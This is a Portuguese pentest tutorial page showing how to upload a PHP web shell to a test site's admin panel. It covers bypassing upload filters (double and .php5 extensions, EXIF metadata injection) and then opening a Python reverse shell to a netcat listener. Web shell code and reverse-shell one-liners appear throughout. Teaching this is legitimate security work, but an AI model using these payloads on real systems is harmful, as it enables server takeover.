@@ -1,0 +1,135 @@
+https://docs.andalik.com.br/guia-para-pentesters/procedimento-operacional-padrao-pop/pentest/shell-upload#metodo-4-injetar-codigo-php-nos-metadados-da-imagem
+
+Web Shell Upload
+Web Shell Upload
+Burlando filtros de upload e obtendo shell reverso
+
+Após o ataque bem sucedido de SQL Injection, devemos tentar realizar o upload de um web shell.
+
+Para isso, novamente utilizaremos o site de teste abaixo:
+
+www.bancocn.com/admin
+
+Nos passos anteriores, descobrimos o usuário e senha de administração do site via SQLi. Portanto, acesse o referido site e logue como admin. 
+
+Observe que na página de administração do site, há uma opção de upload de imagens. 
+
+A funcionalidade de upload normalmente é um excepcional alvo para testes de vulnerabilidades. Fique atento à ela.
+
+Inicialmente, explore a funcionalidade com uma imagem comum. Tente localizar e exibir a imagem enviada através do próprio website, e com a ferramenta de Developer do navegador, capture o caminho da imagem. Exemplo:
+
+www.bancocn.com/admin/uploads/imagem.jpg
+
+Seguindo, sabemos que o servidor alvo interpreta código PHP, portanto, tentaremos subir um arquivo malicioso em PHP (obviamente). 
+
+Vamos criar nosso arquivo malicioso. Abra o editor e crie um arquivo chamado shell.php com o seguinte conteúdo:
+
+<?php
+    echo shell_exec($_GET["comando"]);
+?>
+
+Agora, se tentarmos realizar o upload do arquivo PHP via website, o sistema irá bloquear por não se tratar de uma imagem. Mas há inúmeras formas de contornar a validação.
+Método 1: Dupla extensão:
+
+Códigos mal-escritos podem apenas verificar se existe alguma extensão válida no nome do arquivo, portanto, podemos testar renomeando o arquivo de shell.php para shell.jpg.php. Apesar da dupla extensão, o código permanece sendo um script php válido. Em seguida, teste o upload.
+Método 2: Extensão interpretável incomum:
+
+Além da extensão php, o interpretador também reconhece a extensão php5, portanto, podemos testar renomeando o arquivo de shell.php para shell.php5. Em seguida, teste o upload.
+
+Desta vez, o site de teste não filtrou corretamente a extensão fornecida e permitiu o upload do arquivo. Agora, no navegador, faça:
+
+www.bancocn.com/admin/uploads/shell.php5?comando=ls
+​
+Retorno: imagem.jpg dsc_0699-min.jpg north-korea-science-technology.jpg
+
+Sucesso! O parâmetro comando recebeu a string ls e executou corretamente o comando de listagem de arquivos. 
+
+Agora, para tomarmos controle do servidor, vamos avançar e obter shell reverso.
+
+Primeiro, identifique seu endereço IP válido, em seguida, certifique-se de possuir um NAT para alcançar seu computador na rede interna (caso esteja conectado via um roteador). 
+
+Em seguida, abra o prompt de comando e coloque o nc em modo listening na porta 443/tcp:
+
+nc -lvp 443
+
+Agora, usando o código malicioso que enviamos anteriormente ao servidor web, vamos formatar um script simples para obtermos shell reverso. Felizmente, já existem exemplos de shell reverso em diversas linguagens em uma única linha. Para isso, acesse o link abaixo:
+Reverse Shell Cheat Sheet | pentestmonkey
+pentestmonkey.net
+
+Procure e copie o shell reverso em python. Lembre-se de alterar o IP e porta para apontar pro seu servidor (aquele que está escutando na porta 443 via netcat):
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("seu_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Agora, cole na url:
+
+www.bancocn.com/admin/uploads/shell.php5?comando=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("seu_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Após chamar a url, verifique se houve conexão com o nc em listening. Caso positivo, o shell reverso foi estabelecido, e portanto, está pronto para receber os comandos.
+
+Adicionalmente, você pode utilizar web shells prontos. Para isso, acesse o link abaixo:
+xl7dev/WebShell
+Webshell && Backdoor Collection. Contribute to xl7dev/WebShell development by creating an account on GitHub.
+github.com
+
+Escolha um web shell, renomei-o para php5 e realize o upload. Pronto!
+Burlando filtros de upload via metadados da imagem e obtendo shell reverso
+
+Mas foi muito fácil! E se o site possuir uma proteção mais eficiente?
+
+Vamos complicar um pouco mais, e portanto, utilizaremos o site de teste mais protegido:
+
+advanced.bancocn.com/admin
+
+Da mesma forma que antes, após SQLi e de posse dos dados de autenticação, podemos observar que a ferramenta de upload não permite o arquivo shell.php5.
+
+Neste caso, vamos tentar uma outra forma de contornar a validação. 
+Método 3: Extensão de arquivo furtiva
+
+Na url, tudo que vier depois de ? é tratado como parâmetro, portanto, se adicionarmos ?.jpg ao nome do arquivo, ele será considerado um JPEG, mas na url ele será considerado parâmetro, e nesse caso, ignorado, portanto, podemos testar renomeando o arquivo de shell.php5 para shell.php5?.jpg. Em seguida, teste o upload.
+
+Apesar disso, o upload foi recusado com o retorno de erro: INVALID CONTENT TYPE.
+Método 4: Injetar código PHP nos metadados da imagem
+
+Como pudemos observar, as tentativas anteriores de contornar a validação não funcionaram. Portanto, vamos injetar o código PHP dentro do arquivo de imagem JPG ou PNG mesmo, especificamente nos METADADOS.
+
+Inicialmente, instale a ferramenta de manipulação de metadados em imagens chamada exiftool:
+
+apt-get install exiftool
+
+Para testar, obtenha uma imagem pequena e execute o comando abaixo para listar os metadados:
+
+exiftool imagem.jpg
+
+Agora, vamos inserir nosso código PHP no campo 'Comment' dos metadados. Para isso, faça:
+
+exiftool -comment="<?php echo shell_exec(\$_GET[\"comando\"]) ?>" imagem.jpg
+
+Perfeito! Vamos repetir o upload da imagem.
+
+Sucesso! A imagem com o código PHP nos metadados foi aceita.
+
+Localize a url completa da imagem e abra no navegador.
+
+advanced.bancocn.com/admin/uploads/imagem.jpg?comando=ls
+
+Observe que a imagem não é exibida, apenas seu código no formato texto sim. E melhor... no meio do referido código, podemos ver o retorno do nosso comando ls.
+
+Portanto, podemos novamente executar o shell reverso em Python.
+
+Primeiro, identifique seu endereço IP válido, em seguida, certifique-se de possuir um NAT para alcançar seu computador na rede interna (caso esteja conectado via um roteador). 
+
+Em seguida, abra o prompt de comando e coloque o nc em modo listening na porta 443/tcp:
+
+nc -lvp 443
+
+Procure e copie o shell reverso em python. Lembre-se de alterar o IP e porta para apontar pro seu servidor (aquele que está escutando na porta 443 via netcat):
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("seu_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Agora, cole na url:
+
+advanced.bancocn.com/admin/uploads/imagem.jpg?comando=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("seu_ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Após chamar a url, verifique se houve conexão com o nc em listening. Caso positivo, o shell reverso foi estabelecido, e portanto, está pronto para receber os comandos.
+
+​
